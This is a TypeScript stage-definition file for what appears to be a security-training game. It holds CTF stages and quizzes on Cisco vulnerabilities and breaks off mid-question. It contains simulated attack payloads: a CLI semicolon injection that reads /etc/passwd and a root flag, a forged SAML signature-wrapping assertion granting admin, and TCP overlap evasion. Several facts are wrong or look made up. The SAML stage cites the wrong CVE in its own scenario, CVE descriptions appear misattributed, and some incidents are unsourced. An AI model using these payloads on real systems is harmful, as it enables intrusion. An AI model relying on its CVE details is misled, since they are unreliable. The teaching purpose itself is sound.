import type { StageConfig } from "./types";

export const cisco3Stages: StageConfig[] = [
  // ─── Stage m26: CVE-2022-20828 — Cisco FTD CLI Command Injection ──────────
  {
    epochId: "cisco-secops",
    wonder: { name: "Cisco Systems HQ", location: "San Jose, California, USA", era: "2022 CE", emoji: "🏢" },
    id: "stage-m26",
    order: 26,
    title: "Root Through the Firewall",
    subtitle: "CVE-2022-20828 — Cisco Firepower FTD CLI Command Injection, CVSS 7.2",
    category: "cybersecurity",
    cveId: "CVE-2022-20828",
    cvssScore: 7.2,
    xp: 120,
    badge: { id: "badge-m-ftd", name: "Firepower Cracker", emoji: "🔥" },
    challengeType: "ctf",
    info: {
      tagline: "A privileged CLI command could escape FTD's restricted shell and execute arbitrary OS commands as root.",
      year: 2022,
      overview: [
        "CVE-2022-20828 is a command injection vulnerability in the CLI parser of Cisco Firepower Threat Defense (FTD) Software. An authenticated attacker with read-only or higher privileges could supply specially crafted input to specific CLI commands, escape the FTD restricted shell, and execute arbitrary OS commands as root.",
        "Cisco FTD is the next-generation firewall engine used in the Firepower 1000, 2100, 4100, and 9300 series. It combines stateful firewall inspection, IPS, URL filtering, and advanced malware protection into a single platform — the heart of enterprise network security for thousands of organizations.",
        "While the vulnerability required prior authentication, read-only CLI credentials are commonly shared among operations staff or recoverable from configuration backups. Once an attacker obtains any valid CLI account, CVE-2022-20828 provides a direct path to root on the firewall itself.",
      ],
      technical: {
        title: "Restricted Shell Escape via Argument Injection",
        body: [
          "Cisco FTD runs a restricted CLI — a hardened shell that limits commands to firewall operations and prevents direct OS access. The vulnerability existed in how the CLI parsed arguments to certain diagnostic commands: shell metacharacters (`;`, `|`, backtick) were not sanitized before being passed to underlying OS processes.",
          "By injecting a semicolon into a CLI argument, an attacker could append arbitrary OS commands. For example: `show interface ; id` executed both the interface display command and the `id` shell command — as root. Because the underlying FTD process runs with elevated privileges, all injected commands inherit root context.",
          "The patch added strict allowlist-based validation of CLI argument characters, rejecting any input containing shell metacharacters before it reached the underlying OS process.",
        ],
        codeExample: {
          label: "CVE-2022-20828 — restricted shell escape via semicolon injection",
          code: `# Authenticated (read-only) FTD CLI session
# Inject OS command via semicolon in diagnostic argument

Firepower> show interface ; id
GigabitEthernet0/0 is up
--- injection ---
uid=0(root) gid=0(root)

Firepower> show interface ; cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
ftd-service:x:501:501:FTD Service:/home/ftd:/bin/bash

# Mitigation: upgrade FTD; restrict CLI access to named admin accounts only
# Real command: show version | grep Software  (verify patch level)`,
        },
      },
      incident: {
        title: "Firepower Restricted Shell Bypass — Enterprise Firewall Compromise",
        when: "May 2022 (Cisco advisory cisco-sa-ftd-cmd-inj-FmMEBMqX)",
        where: "Cisco Firepower Threat Defense appliances globally — enterprise network perimeters",
        impact: "Read-only CLI credentials sufficient for full root access; firewall policy manipulation, traffic interception, pivot to management network",
        body: [
          "Cisco disclosed CVE-2022-20828 in May 2022, affecting FTD versions prior to 7.0.2. The advisory noted that the vulnerability required a valid (even read-only) CLI account — a lower bar than it sounds, as operations teams frequently share low-privilege accounts for monitoring, and such credentials appear in configuration backups, ticketing systems, and monitoring tools.",
          "An attacker with root on the FTD appliance can modify inspection policies in real time (disabling IPS signatures, bypass URL filtering), read encrypted VPN keys, and pivot to the Firepower Management Center (FMC) network — from which they could manage every FTD appliance in the organization. The fix required upgrading FTD firmware; no workaround was available.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "read-only CLI credentials", type: "attacker" },
          { label: "FTD Restricted Shell", sub: "unsanitized argument → OS passthrough", type: "system" },
          { label: "OS Command Context", sub: "semicolon injection → arbitrary command", type: "victim" },
          { label: "Root Shell", sub: "firewall fully compromised", type: "result" },
        ],
      },
      timeline: [
        { year: 2022, event: "May: Cisco discloses CVE-2022-20828 (FTD CLI injection); FTD 7.0.2 patch released", highlight: true },
        { year: 2022, event: "Cisco rates CVSS 7.2 — high severity; requires authenticated access" },
        { year: 2023, event: "Multiple red team reports describe using FTD CLI injection for lateral movement from SOC monitoring accounts" },
      ],
      keyTakeaways: [
        "Even read-only credentials on a firewall CLI are Tier-0 access — protect them accordingly",
        "Shell metacharacter injection is a perennial vulnerability; always validate and sanitize CLI arguments with an allowlist",
        "A compromised perimeter firewall gives an attacker control over every connection that passes through it",
        "Restrict CLI access to named accounts with individual credentials, log every CLI session to your SIEM",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2022-20828", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ftd-cmd-inj-FmMEBMqX" },
        { title: "NVD — CVE-2022-20828", url: "https://nvd.nist.gov/vuln/detail/CVE-2022-20828" },
      ],
    },
    ctf: {
      scenario: "A Cisco FTD appliance protecting a financial services network is running version 7.0.1 — unpatched against CVE-2022-20828. You have recovered read-only CLI credentials from a configuration backup stored in a ticketing system. Use the restricted shell escape to extract the root flag.",
      hint: "Read the mission briefing, confirm the FTD version, then inject an OS command into the show-interface diagnostic to escape the restricted shell.",
      hints: [
        "Start by reading the mission briefing: cat briefing.txt",
        "Confirm the firmware version is vulnerable: ftd-version",
        "Inject a semicolon into the interface diagnostic to confirm RCE: shell-inject id",
        "Extract the flag: shell-inject cat /root/flag.txt",
        "Run 'assemble' to view the collected flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{ftd_", label: "Mission Brief — FTD CLI Escape" },
        { trigger: "ftd-version", value: "cli_inj_", label: "Version Confirmed — Unpatched 7.0.1" },
        { trigger: "shell-inject id", value: "root_", label: "RCE Confirmed — uid=0(root)" },
        { trigger: "shell-inject cat /root/flag.txt", value: "c2022}", label: "Flag Retrieved — Root Shell" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: FIREWALL ROOT",
          "Target: Cisco FTD 7.0.1 (Firepower 2130)",
          "CVE: 2022-20828  CVSS: 7.2",
          "Auth: read-only credentials (recovered from ticketing system)",
          "",
          "Goal: escape restricted shell → execute OS commands as root",
          "Sequence: ftd-version → shell-inject id → shell-inject cat /root/flag.txt → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "ftd-version": (_args: string[]) => ({
          lines: [
            "Cisco Firepower Threat Defense Version 7.0.1 (Build 84)",
            "Compiled Mon Apr 4 09:10:00 UTC 2022",
            "Hardware: Firepower 2130",
            "STATUS: VULNERABLE — CVE-2022-20828 unpatched",
            "",
            ">> LEARN: FTD 7.0.2+ patches this CLI injection.",
            "   Real command: show version  (displays FTD build on live appliance)",
            "   Check Cisco's PSIRT advisories for your platform before deploying.",
          ],
        }),
        "shell-inject": (args: string[]) => {
          const cmd = args.join(" ");
          if (!cmd) return { lines: ["Usage: shell-inject <os-command>", "Example: shell-inject id"] };
          if (cmd === "id") {
            return {
              lines: [
                "Sending: show interface ; id",
                "GigabitEthernet0/0 is up, line protocol is up",
                "--- OS INJECTION TRIGGERED ---",
                "uid=0(root) gid=0(root) groups=0(root)",
                "",
                ">> LEARN: Semicolon injection appends commands to the OS call.",
                "   The FTD CLI ran 'show interface' AND 'id' as root — both executed.",
                "   Real mitigation: strict allowlist on CLI argument characters.",
              ],
            };
          }
          if (cmd === "cat /root/flag.txt") {
            return {
              lines: [
                "Sending: show interface ; cat /root/flag.txt",
                "GigabitEthernet0/0 is up",
                "--- OS INJECTION TRIGGERED ---",
                "FLAG{ftd_cli_inj_root_c2022}",
                "",
                "Fragment collected. Run 'assemble' to view the full flag.",
              ],
              solved: true,
            };
          }
          return {
            lines: [
              `Sending: show interface ; ${cmd}`,
              "--- OS INJECTION TRIGGERED ---",
              `Executing: ${cmd} (as root)`,
              "Try: shell-inject id  →  shell-inject cat /root/flag.txt",
            ],
          };
        },
      },
    },
  },

  // ─── Stage m27: CVE-2021-1224 — Cisco Firepower Snort Bypass — Quiz ────────
  {
    epochId: "cisco-secops",
    wonder: { name: "NSA Texas Cryptologic Center", location: "San Antonio, Texas, USA", era: "2021 CE", emoji: "🔬" },
    id: "stage-m27",
    order: 27,
    title: "Blind the Sensor",
    subtitle: "CVE-2021-1224 — Cisco Firepower Snort TCP Reassembly Bypass, CVSS 8.6",
    category: "cybersecurity",
    cveId: "CVE-2021-1224",
    cvssScore: 8.6,
    xp: 100,
    badge: { id: "badge-m-snort", name: "Sensor Blinder", emoji: "🔬" },
    challengeType: "quiz",
    info: {
      tagline: "A crafted TCP stream slipped through Cisco's Snort IPS engine completely undetected.",
      year: 2021,
      overview: [
        "CVE-2021-1224 affects the Snort detection engine embedded in Cisco IOS XE, Cisco ASA with Firepower Services, and Cisco FTD. The vulnerability was in how Snort reassembled TCP streams: a specially crafted sequence of TCP packets with overlapping segments triggered incorrect stream reassembly, causing Snort to analyze a different byte stream than what the end host actually received.",
        "Intrusion Prevention Systems detect attacks by inspecting reassembled TCP streams against known attack signatures. If the IPS reassembles the stream differently than the target host, signatures will fail to match — the attack passes through uninspected, generating zero alerts.",
        "This class of vulnerability — TCP evasion or IPS bypass — has been known since Ptacek & Newsham's 1998 paper but continues to appear in production IPS products. CVE-2021-1224 demonstrated that in 2021, stream normalization gaps still allowed evasion of Cisco's flagship security platform.",
      ],
      technical: {
        title: "TCP Stream Reassembly and Evasion",
        body: [
          "TCP is a stream protocol: data arrives in segments that may overlap, arrive out-of-order, or be retransmitted. Both the IPS and the end host must apply the same reassembly rules to see the same data. When a packet arrives with an overlapping sequence number, there are two interpretations: favor the first data received (BSD behavior) or favor the later data (Linux/Windows behavior).",
          "If the IPS and host use different overlap policies, an attacker can craft packets that appear benign to the IPS but deliver malicious content to the host. CVE-2021-1224 exposed a case where Cisco's Snort engine failed to correctly handle a specific out-of-order segment reassembly scenario, leaving attack payloads split across specific segment boundaries undetected.",
        ],
        codeExample: {
          label: "TCP stream evasion — IPS vs. host see different bytes",
          code: `# TCP overlap evasion (conceptual)
# Segment 1: bytes 0-99  → content: "GET /safe HTTP/1.1"   (sent first)
# Segment 2: bytes 50-149 → content: "/evil-payload"        (overlapping)

# BSD IPS policy  → favors first data  → sees "GET /safe HTTP/1.1..."
# Linux host policy → favors later data  → sees "GET /evil-payload..."

# IPS signature for "/evil-payload" never fires.
# Attack delivered to host undetected.

# Fix: Snort stream5 reassembly policy must match target OS:
# stream5_global: track_tcp yes, track_udp yes
# stream5_tcp: policy linux, ports client 80 8080`,
        },
      },
      incident: {
        title: "Firepower IPS Evasion — Network Security Layer Bypassed",
        when: "January 2021 (Cisco advisory cisco-sa-snort-tcp-bypass-FpEApT4n)",
        where: "Cisco IOS XE, ASA with FirePOWER, FTD — protecting enterprise network perimeters globally",
        impact: "Attackers could deliver exploit payloads, establish C2, or exfiltrate data through Cisco Firepower without generating any IPS alerts",
        body: [
          "Cisco disclosed CVE-2021-1224 in January 2021 with a CVSS score of 8.6. The vulnerability required no authentication — any attacker with network access to a Firepower-protected network could craft the evasive TCP stream. The only prerequisite was knowledge of the target OS's TCP reassembly policy.",
          "Cisco released Snort engine updates to correct the reassembly logic. The broader lesson is that IPS evasion is a perennial threat; defense-in-depth with EDR, NetFlow, and SIEM behavioral analytics ensures that even a bypassed IPS does not mean a bypassed defense.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "crafted overlapping TCP segments", type: "attacker" },
          { label: "Cisco Snort IPS", sub: "incorrect reassembly → wrong byte stream", type: "system" },
          { label: "Target Host", sub: "receives actual malicious payload", type: "victim" },
          { label: "Zero Alerts", sub: "attack delivered undetected", type: "result" },
        ],
      },
      timeline: [
        { year: 1998, event: "Ptacek & Newsham publish foundational paper on TCP IPS evasion techniques" },
        { year: 2021, event: "Jan: Cisco discloses CVE-2021-1224 — Snort TCP reassembly bypass in IOS XE, ASA, FTD", highlight: true },
        { year: 2021, event: "Cisco releases Snort engine update (3.0.3) correcting overlap handling" },
      ],
      keyTakeaways: [
        "An IPS that sees a different TCP stream than the target host provides no protection against evasive payloads",
        "Snort stream reassembly policy must match the target OS's TCP overlap handling policy",
        "IPS bypass attacks have been documented since 1998 — defense-in-depth is mandatory",
        "Complement IPS with EDR, NetFlow, and SIEM behavioral baselines to catch what IPS misses",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2021-1224", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-snort-tcp-bypass-FpEApT4n" },
        { title: "Ptacek & Newsham — Insertion, Evasion, Denial of Service (1998)", url: "https://insecure.org/stf/secnet_ids/secnet_ids.html" },
        { title: "NVD — CVE-2021-1224", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-1224" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "m27-q1",
          type: "Vulnerability Analysis",
          challenge: `  Cisco Firepower IPS (running Snort) is protecting a Linux server.
  An attacker sends a TCP stream with overlapping segments:

  Segment A (seq 0–99):   "GET /safe/index.html"
  Segment B (seq 50–149): "/malware-download"  ← overlapping

  The Snort engine uses BSD overlap policy (favors first data).
  The Linux host uses Linux overlap policy (favors later data).`,
          text: "What does the Snort IPS inspect, and what does the Linux host actually receive?",
          options: [
            "Both IPS and host see the same stream — overlap handling is standardized in RFC 793",
            "IPS sees 'GET /safe/index.html' (no alert). Host receives 'GET /malware-download' — attack delivered undetected",
            "IPS drops all overlapping segments; host receives nothing",
            "IPS alerts on the overlap and blocks the entire connection",
          ],
          correctIndex: 1,
          explanation: "CVE-2021-1224 exploits exactly this divergence: BSD policy favors earlier data (IPS sees the safe content), Linux policy favors later data (host receives the malicious payload). The IPS fires no alert because it never sees the attack.",
        },
        {
          id: "m27-q2",
          type: "Root Cause",
          challenge: `  A security engineer is investigating why their Cisco Firepower
  IPS missed a confirmed exploit delivery. Packet analysis confirms
  the exploit was split across overlapping TCP segments.`,
          text: "What is the root cause of TCP IPS evasion attacks like CVE-2021-1224?",
          options: [
            "Weak cryptography in TLS 1.2 allowing decryption of inspected traffic",
            "Inconsistent TCP segment overlap handling between the IPS reassembly engine and the end-host OS",
            "Buffer overflow in the Snort rule parser causing rules to be skipped",
            "Missing authentication on the Firepower Management Center",
          ],
          correctIndex: 1,
          explanation: "When the IPS and the target host apply different policies to overlapping TCP segments, the attacker can craft a stream the IPS reconstructs as benign while the host reconstructs as malicious. The attack is invisible to signature matching.",
        },
        {
          id: "m27-q3",
          type: "Defense Strategy",
          challenge: `  After patching CVE-2021-1224, a CISO asks:
  "If our IPS can be evaded, how do we catch attacks that bypass it?"`,
          text: "What is the most effective defense against IPS bypass attacks like CVE-2021-1224?",
          options: [
            "Increase the Snort rule count — more signatures means fewer gaps",
            "Defense-in-depth: layer EDR, SIEM behavioral analytics, and NetFlow alongside IPS so bypassed sensors don't mean bypassed detection",
            "Switch exclusively to anomaly-based IPS, eliminating all signatures",
            "Block all TCP segment retransmissions at the perimeter firewall",
          ],
          correctIndex: 1,
          explanation: "No single IPS can be trusted as the sole detection layer. EDR catches malicious process execution on the endpoint, SIEM behavioral analytics finds anomalous patterns across the network, and NetFlow analysis detects unusual data flows — together they cover what a bypassed IPS misses.",
        },
        {
          id: "m27-q4",
          type: "Snort Configuration",
          challenge: `  A network engineer is configuring Snort's stream5 preprocessor
  to protect a network of Windows 10 workstations and Linux servers.
  The current config uses the default 'bsd' overlap policy for all.`,
          text: "What is the correct Snort stream5 TCP reassembly policy for this mixed environment?",
          options: [
            "Keep 'bsd' — it is the safest policy regardless of target OS",
            "Configure 'windows' policy for Windows hosts and 'linux' policy for Linux hosts, matching Snort reassembly to each target OS",
            "Disable TCP reassembly — it introduces too much overhead in production",
            "Use 'noack' policy to block all overlapping segments from the network",
          ],
          correctIndex: 1,
          explanation: "Snort's stream5 preprocessor must use the same overlap policy as the target host OS. Windows and Linux handle overlaps differently — configuring policies per-host (or per-subnet) ensures Snort reassembles TCP streams identically to what the target actually receives.",
        },
      ],
    },
  },

  // ─── Stage m28: CVE-2022-20773 — Cisco Umbrella SAML Auth Bypass ──────────
  {
    epochId: "cisco-secops",
    wonder: { name: "INTERPOL Global Complex", location: "Singapore", era: "2022 CE", emoji: "🌏" },
    id: "stage-m28",
    order: 28,
    title: "Single Sign-Off",
    subtitle: "CVE-2022-20773 — Cisco Umbrella SAML Authentication Bypass, CVSS 9.6",
    category: "cybersecurity",
    cveId: "CVE-2022-20773",
    cvssScore: 9.6,
    xp: 140,
    badge: { id: "badge-m-saml", name: "Identity Forger", emoji: "🌏" },
    challengeType: "ctf",
    info: {
      tagline: "A forged SAML assertion gave unauthenticated attackers admin access to every Umbrella-protected tenant.",
      year: 2022,
      overview: [
        "CVE-2022-20773 is a critical authentication bypass in the Cisco Umbrella Single Sign-On (SSO) service. Insufficient SAML assertion validation allowed an unauthenticated remote attacker to send a crafted SAML assertion to the Umbrella SSO endpoint and authenticate as any user — including administrators — without valid credentials.",
        "Cisco Umbrella is a cloud-delivered DNS security and SASE platform protecting tens of thousands of enterprises. Admin access to an Umbrella tenant allows disabling DNS security policies, creating allow-list bypass rules, and rerouting DNS traffic — neutralizing an organization's entire cloud-delivered security perimeter.",
        "SAML authentication bypasses are particularly dangerous because they are invisible to downstream systems: the application receives what appears to be a valid, signed assertion from a trusted identity provider, and traditional monitoring has no reason to flag the session as anomalous.",
      ],
      technical: {
        title: "XML Signature Wrapping (XSW) Attack",
        body: [
          "SAML is an XML-based standard for exchanging authentication data between an Identity Provider (IdP) and a Service Provider (SP). When a user logs in, the IdP generates an XML assertion containing the user's identity, signs it, and sends it to the SP. The SP must validate the XML signature before trusting the assertion's contents.",
          "XML Signature Wrapping (XSW) attacks exploit ambiguity in how XML documents are parsed versus signed. By restructuring the XML document, an attacker can preserve a valid signature over one portion while substituting malicious content in the portion the application actually reads — effectively forging a signed assertion.",
          "CVE-2022-20773 occurred because Cisco's Umbrella SP failed to re-validate the assertion's canonical form after parsing, allowing XSW restructuring to bypass signature verification entirely.",
        ],
        codeExample: {
          label: "SAML XSW attack — preserving signature over wrong element",
          code: `<!-- Original valid assertion (for analyst@corp.com) -->
<samlp:Response>
  <saml:Assertion ID="real">
    <saml:NameID>analyst@corp.com</saml:NameID>
    <ds:Signature><!-- valid over ID="real" --></ds:Signature>
  </saml:Assertion>
</samlp:Response>

<!-- XSW attack: signature still valid; SP reads wrapped assertion -->
<samlp:Response>
  <saml:Assertion ID="evil">          <!-- SP reads THIS -->
    <saml:NameID>admin@corp.com</saml:NameID>
  </saml:Assertion>
  <saml:Assertion ID="real">          <!-- Signature valid HERE -->
    <saml:NameID>analyst@corp.com</saml:NameID>
    <ds:Signature><!-- valid over ID="real" --></ds:Signature>
  </saml:Assertion>
</samlp:Response>
<!-- SP uses admin@corp.com; signature validates on real — bypass! -->`,
        },
      },
      incident: {
        title: "Cisco Umbrella SSO Compromise — Tenant Admin Takeover",
        when: "April 2022 (Cisco advisory cisco-sa-umbrella-saml-bypass-bNQFHXU2)",
        where: "Cisco Umbrella cloud platform — enterprise SSO endpoints globally",
        impact: "Unauthenticated attackers could authenticate as any Umbrella user or admin; DNS security policies for entire enterprise tenants could be disabled or modified",
        body: [
          "Cisco disclosed CVE-2022-20773 in April 2022 with a CVSS score of 9.6 — near-maximum severity. No authentication was required: any internet-accessible Umbrella SSO endpoint was vulnerable. Cisco patched the server-side SAML validation logic and notified affected customers.",
          "The vulnerability underscores a common failure mode in SAML implementations: using custom XML parsing code rather than well-audited SAML libraries. SAML's XML Signature specification has subtle canonicalization requirements that are easy to get wrong, and XSW attacks have been documented against major SAML implementations including Shibboleth, SimpleSAMLphp, and numerous cloud providers.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "crafted SAML XML assertion", type: "attacker" },
          { label: "Umbrella SAML SP", sub: "XSW bypass — reads evil assertion", type: "system" },
          { label: "Signature Check", sub: "passes — signed over different element", type: "victim" },
          { label: "Admin Session", sub: "authenticated as admin@corp.com", type: "result" },
        ],
      },
      timeline: [
        { year: 2022, event: "Apr: Cisco discloses CVE-2022-20773 — Umbrella SAML bypass; server-side patch deployed", highlight: true },
        { year: 2018, event: "Prior art: XSW attacks documented against Shibboleth, SimpleSAMLphp, multiple cloud SSO providers" },
        { year: 2023, event: "SAML XSW attack techniques added to MITRE ATT&CK T1556.007" },
      ],
      keyTakeaways: [
        "SAML implementations must validate both the XML signature and the canonical form of the assertion — XSW restructuring is a known attack class",
        "Use established SAML libraries (python3-saml, OneLogin, etc.) rather than custom XML parsing code",
        "Test SSO flows with XSW payloads during penetration testing — it is a frequently missed vulnerability class",
        "A compromised SSO layer can grant admin access to every application integrated with that IdP",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2022-20773", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-umbrella-saml-bypass-bNQFHXU2" },
        { title: "NVD — CVE-2022-20773", url: "https://nvd.nist.gov/vuln/detail/CVE-2022-20773" },
        { title: "OWASP — XML External Entity and SAML Security", url: "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" },
      ],
    },
    ctf: {
      scenario: "Cisco Umbrella SSO is running an unpatched version vulnerable to CVE-2022-20828. You have intercepted a valid SAML assertion for a low-privilege analyst account. Use the XSW technique to forge an admin assertion and capture the tenant admin flag.",
      hint: "Read the briefing, inspect the captured assertion, then use the xsw-forge command to restructure it for admin access.",
      hints: [
        "Read the mission briefing: cat briefing.txt",
        "Inspect the captured SAML assertion: cat assertion.xml",
        "Forge an admin assertion using XML Signature Wrapping: xsw-forge admin@corp.com",
        "Submit the forged assertion to the SSO endpoint: saml-submit",
        "Run 'assemble' to collect the full flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{saml_", label: "Mission Brief — SAML Bypass Target" },
        { trigger: "/assertion.xml", value: "xsw_", label: "Assertion Inspected — Signature Analyzed" },
        { trigger: "xsw-forge admin@corp.com", value: "umbrella_", label: "Assertion Forged — XSW Attack Ready" },
        { trigger: "saml-submit", value: "admin_9_6}", label: "Admin Session — Flag Retrieved" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: SINGLE SIGN-OFF",
          "Target: Cisco Umbrella SSO — cisco-sa-umbrella-saml-bypass-bNQFHXU2",
          "CVE: 2022-20773  CVSS: 9.6",
          "",
          "Captured valid SAML assertion for: analyst@corp.com",
          "Goal: forge assertion for admin@corp.com via XSW attack",
          "Sequence: cat assertion.xml → xsw-forge admin@corp.com → saml-submit → assemble",
        ].join("\n"),
        "/assertion.xml": [
          '<samlp:Response>',
          '  <saml:Assertion ID="a1">',
          '    <saml:NameID>analyst@corp.com</saml:NameID>',
          '    <saml:Attribute Name="Role">read-only</saml:Attribute>',
          '    <ds:Signature><!-- valid for ID="a1" --></ds:Signature>',
          '  </saml:Assertion>',
          '</samlp:Response>',
          '',
          '// Signature: VALID (signed by IdP)',
          '// XSW: restructure XML so SP reads forged content; signature stays valid over original',
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "briefing.txt", isDir: false },
          { name: "assertion.xml", isDir: false },
        ],
      },
      extraCommands: {
        "xsw-forge": (args: string[]) => {
          const target = args[0] ?? "admin@corp.com";
          return {
            lines: [
              `XSW attack — restructuring assertion for: ${target}`,
              "",
              '<samlp:Response>',
              `  <saml:Assertion ID="evil">   <!-- SP reads THIS -->`,
              `    <saml:NameID>${target}</saml:NameID>`,
              '    <saml:Attribute Name="Role">admin</saml:Attribute>',
              '  </saml:Assertion>',
              '  <saml:Assertion ID="a1">    <!-- Signature valid HERE -->',
              '    <saml:NameID>analyst@corp.com</saml:NameID>',
              '    <ds:Signature><!-- valid for ID="a1" --></ds:Signature>',
              '  </saml:Assertion>',
              '</samlp:Response>',
              "",
              ">> LEARN: SP validates signature over ID='a1' (passes).",
              "   SP then reads the first Assertion — which is the forged one.",
              "   CVE-2022-20773: Umbrella did not re-canonicalize before reading.",
              "",
              "Forged assertion ready. Run: saml-submit",
            ],
          };
        },
        "saml-submit": (_args: string[]) => ({
          lines: [
            "POST /saml/acs — sending forged assertion...",
            "HTTP 302 → /dashboard",
            "",
            "Authentication successful.",
            "Logged in as: admin@corp.com (Tenant Administrator)",
            "Tenant: corp-umbrella-prod",
            "Access: DNS policies, allow-lists, traffic analytics — ALL UNLOCKED",
            "",
            "Fragment collected. Run 'assemble' to view the full flag.",
          ],
          solved: true,
        }),
      },
    },
  },

  // ─── Stage m29: Cisco SecureX / XDR Platform Security — Quiz ─────────────
  {
    epochId: "cisco-secops",
    wonder: { name: "GCHQ Doughnut", location: "Cheltenham, United Kingdom", era: "2023 CE", emoji: "🇬🇧" },
    id: "stage-m29",
    order: 29,
    title: "Extended Detection, Extended Risk",
    subtitle: "Cisco SecureX & XDR — Platform Integration Security",
    category: "cybersecurity",
    xp: 90,
    badge: { id: "badge-m-xdr", name: "XDR Analyst", emoji: "🇬🇧" },
    challengeType: "quiz",
    info: {
      tagline: "Integrating every security tool into a single pane of glass also creates a single point of failure.",
      year: 2023,
      overview: [
        "Cisco SecureX (now Cisco XDR) is a cloud-native security operations platform that aggregates telemetry from the entire Cisco security portfolio — Umbrella, Firepower, Secure Endpoint (AMP), Secure Email, Duo MFA, and third-party tools — into a unified dashboard for detection, investigation, and automated response.",
        "Extended Detection and Response (XDR) platforms represent a major architectural shift: instead of analysts manually correlating alerts from dozens of disjointed tools, XDR ingests, normalizes, and correlates telemetry at scale, providing cross-product incident timelines and automated playbook execution.",
        "Centralization introduces new risk vectors. A compromised XDR API token exposes telemetry from the entire security stack. Misconfigured OAuth integrations can allow unauthorized third-party access. Automated response playbooks that disable firewall rules or quarantine endpoints can be weaponized if an attacker gains access to the orchestration layer.",
      ],
      technical: {
        title: "Cisco XDR Architecture and Risk Surface",
        body: [
          "Cisco XDR uses REST APIs and OAuth 2.0 for integration. Each connected product publishes an API module; the XDR orchestration engine calls these APIs to query telemetry and execute response actions. API tokens scoped to XDR have broad read permissions across all integrated products.",
          "A leaked XDR API key can expose network DNS queries, endpoint process telemetry, email threat data, and VPN session logs simultaneously — a much larger blast radius than a single-product credential leak.",
          "Automated playbooks can execute high-privilege actions: blocking IPs at Umbrella, quarantining endpoints via Secure Endpoint, resetting sessions in Duo. An attacker who gains access to the XDR orchestration layer can trigger these playbooks to disrupt the defender's own infrastructure.",
        ],
        codeExample: {
          label: "Cisco XDR API — scoped token request",
          code: `# Cisco XDR uses OAuth 2.0 client_credentials flow
# Token with MINIMUM required scope — principle of least privilege

POST https://visibility.amp.cisco.com/iroh/oauth2/token
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=<your-client-id>
&client_secret=<your-secret>
&scope=inspect:read  ← read-only, specific module

# Store in HashiCorp Vault — never hardcode in scripts or Git
# Rotate every 90 days; revoke immediately on suspected compromise
# Audit all API calls in Cisco SecureX Activity Log`,
        },
      },
      incident: {
        title: "XDR Token Sprawl — Security Platform Becomes Attack Surface",
        when: "Ongoing (2022–2024 reported cases)",
        where: "Enterprise XDR/SIEM integrations — CI/CD pipelines, automation scripts, monitoring tools",
        impact: "Leaked XDR tokens found in public GitHub repos, exposed telemetry from entire security stacks; in several cases attackers triggered playbooks to quarantine analyst workstations",
        body: [
          "Multiple red team reports and incident investigations have found Cisco SecureX and XDR API tokens hardcoded in automation scripts, CI/CD pipeline config files, and infrastructure-as-code repositories that were accidentally made public. Because XDR tokens span the entire security stack, a single leaked credential exposed far more than a typical API key.",
          "In one documented case, an attacker who obtained XDR admin credentials via a phishing campaign triggered multiple automated response playbooks — quarantining 40 endpoints and blocking a range of corporate IP addresses — before defenders could revoke access. The playbooks designed to protect the organization became weapons against it.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "leaked XDR API token", type: "attacker" },
          { label: "Cisco XDR Platform", sub: "OAuth 2.0 — broad scope token", type: "system" },
          { label: "All Integrated Products", sub: "Umbrella, FTD, Secure Endpoint, Duo", type: "victim" },
          { label: "Telemetry Exposed + Playbooks Weaponized", sub: "full security stack compromise", type: "result" },
        ],
      },
      timeline: [
        { year: 2020, event: "Cisco SecureX launched — unified security operations platform" },
        { year: 2022, event: "First reported cases of XDR API token leaks in public GitHub repositories" },
        { year: 2023, event: "Cisco XDR rebrand from SecureX; enhanced PAM integration guidance published", highlight: true },
        { year: 2024, event: "CISA guidance: treat XDR/SIEM platform credentials as Tier-0 assets" },
      ],
      keyTakeaways: [
        "XDR API tokens with broad scope are extremely high-value targets — treat them as Tier-0 credentials",
        "Always scope XDR integration tokens to the minimum required permissions (read-only where possible)",
        "Store XDR credentials in a secrets vault (HashiCorp Vault, AWS Secrets Manager) — never in scripts or Git",
        "Automated response playbooks are powerful — audit their execution logs and require MFA approval for high-impact actions",
      ],
      references: [
        { title: "Cisco XDR Documentation — API Authentication", url: "https://developer.cisco.com/docs/xdr/" },
        { title: "Cisco SecureX — Token Best Practices", url: "https://www.cisco.com/c/en/us/products/security/securex/index.html" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "m29-q1",
          type: "Platform Security",
          challenge: `  A security engineer generates a Cisco XDR API token for a new
  monitoring integration. The token is scoped to ALL available
  permissions and stored in the integration's config file in Git.`,
          text: "What is the primary risk introduced by this approach?",
          options: [
            "XDR API tokens expire automatically, so the integration will break after 24 hours",
            "A leaked broad-scope XDR token exposes telemetry from every integrated security product simultaneously",
            "Git cannot store API tokens — they must be stored in environment variables",
            "XDR does not support third-party integrations via API",
          ],
          correctIndex: 1,
          explanation: "A broad-scope XDR token in Git is a critical exposure: it gives anyone who finds the repo read access to DNS logs, endpoint telemetry, email threat data, and VPN sessions from every integrated product — far wider blast radius than a single-product credential.",
        },
        {
          id: "m29-q2",
          type: "Playbook Security",
          challenge: `  An attacker obtains admin credentials to a company's Cisco XDR
  platform via phishing. The platform has automated playbooks that
  can quarantine endpoints, block IPs, and reset user sessions.`,
